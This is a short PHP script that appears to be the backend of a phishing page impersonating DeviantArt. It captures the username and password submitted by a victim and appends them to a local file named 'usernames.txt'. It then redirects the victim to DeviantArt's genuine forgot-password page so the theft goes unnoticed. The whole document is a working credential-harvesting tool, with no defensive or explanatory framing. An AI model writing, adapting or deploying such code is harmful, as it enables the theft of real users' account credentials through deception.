<?php

    file_put_contents("usernames.txt", "DeviantArt :- Username : " . $_POST['username'] . "  ||  Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.deviantart.com/users/forgot/');
exit();
